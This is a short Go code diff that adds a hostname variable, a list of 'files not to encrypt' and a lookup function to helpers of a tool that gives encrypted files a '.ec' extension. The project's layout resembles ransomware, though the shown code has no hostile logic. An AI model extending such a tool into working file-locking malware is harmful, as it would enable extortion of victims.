@@ -11,6 +11,12 @@ const MaxSize int = 26214400
 // EncryptedExt : extension for all encrypted files
 const EncryptedExt string = ".ec"
 
+// HostName : Computer hostname
+var HostName string
+
+// SafeFiles : files not to encrypt
+var SafeFiles []string
+
 // BytesToNewFile : creates file from fileName and writes data
 func BytesToNewFile(fileName string, data []byte) (*os.File, error) {
 	//Creates File
@@ -47,4 +53,14 @@ func BytesFromFile(fileName string) ([]byte, error) {
 	openedFile.Close()
 
 	return bytesData, nil
+}
+
+// IsSafeFile : checks if file is to be encrypted or not
+func IsSafeFile(a *string) bool {
+	for _, b := range SafeFiles {
+		if b == *a {
+			return true
+		}
+	}
+	return false
 }
